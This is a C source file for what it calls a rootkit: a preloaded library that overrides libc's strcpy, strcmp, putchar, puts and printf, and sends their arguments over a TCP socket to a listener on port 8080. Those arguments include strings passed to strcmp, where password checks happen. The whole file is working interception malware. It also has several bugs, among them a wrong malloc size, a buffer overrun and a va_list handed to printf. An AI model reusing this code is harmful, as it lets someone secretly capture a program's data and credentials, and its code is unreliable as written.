#include "Rootkit.h"
#include <dlfcn.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>

#define LIBC "/lib/x86_64-linux-gnu/libc.so.6"

#define PORT 8080
#define SA struct sockaddr

void sendData(const char* data, int newline){
    // copy data to new string
    char* copiedData = malloc(strlen(data) + (newline) ? 1 : 0);
    copy(copiedData, data);

    int sockfd;
    struct sockaddr_in servaddr;

    // socket create and varification
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) {
        return;
    }
    
    bzero(&servaddr, sizeof(servaddr));
   
    // assign IP, PORT
    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = inet_addr("127.0.0.1");
    servaddr.sin_port = htons(PORT);
   
    // connect the client socket to server socket
    if (connect(sockfd, (SA*)&servaddr, sizeof(servaddr)) != 0) {
        return;
    }

    // append a newline character to copied data
    int size = strlen(copiedData);
    if (newline) {
        copiedData[size] = '\n';
        copiedData[++size] = '\0';
    }
    
    // send line here
    send(sockfd, copiedData, size, 0);
   
    // close the socket
    close(sockfd);

    // free copied data
    free(copiedData);
}

void copy(char* destination, const char* source){
    int i;
    for (i = 0; source[i] != '\0'; ++i) {
        destination[i] = source[i];
    }

    destination[i] = '\0';
}

char* strcpy(char* destination, const char* source){
    // copy original strcpy
    char* (*func)(char* destination, const char* source) = 
        dlsym(
            dlopen(LIBC, RTLD_NOW),
            "strcpy");

    char* result = func(destination, source);

    sendData("strcpy ", 1);
    sendData("\tdestination: ", 0);
    sendData(destination, 1);

    return result;
}

int strcmp(const char *str1, const char *str2){
    // copy original strcmp
    int (*func)(const char *str1, const char *str2) = 
        dlsym(
            dlopen(LIBC, RTLD_NOW),
            "strcmp");
    
    sendData("strcmp", 1);
    sendData("\tStr1: ", 0);
    sendData(str1, 1);
    sendData("\tStr2: ", 0);
    sendData(str2, 1);

    return func(str1, str2);
}

int putchar(int ch){
    write(1, &ch, 1);

    sendData((void*)&ch, 0);

    return (unsigned char)ch;
}

int puts(const char *str){
    sendData(str, 0);

    return write(1, str, strlen(str));
}

int printf(const char *format, ...){
    // copy original printf
    int (*func)(const char *format, ...) = 
        dlsym(
            dlopen(LIBC, RTLD_NOW),
            "printf");

    // send
    sendData("Format: ", 0);
    sendData(format, 1);

    // get count of arguments in printf and argument types
    int count = 0;
    char* types = malloc(strlen(format));
    char ch = format[count];
    for (int i = 0; ch != '\0'; i++) {
        if(format[i] == '%'){
            types[count++] = format[i + 1];
            types[count] = '\0';
        }
        ch = format[i];
    }
    
    sendData(types, 1);

    va_list arg;
    va_start(arg, format);

    // call orginal function
    int result = func(format, arg);

    // process arguments
    processprintfargs(types, count, arg);

    va_end(arg);

    return result;
}

void processprintfargs(char *types, int count, va_list arg){
    // iterate through arguments
    for (int i = 0; i < count; i++) {
        sendData("\n\tArgument --- ", 0);
        switch (types[i]) {
            case 'i':
                sendData("\n\tinterger: \t", 0);

                char* tempStr = malloc(1024);
                int tempInt = 0;
                // get int arguemetn
                tempInt = va_arg(arg, int);
                
                // create string from integer
                sprintf(tempStr, "%i", tempInt);

                // print to standard out
                puts(tempStr);

                free(tempStr);
                break;
            case 's':
                sendData("\n\tstring: \t", 0);
                puts(va_arg(arg, const char*));
                break;
            default:
                break;
        }
    }
}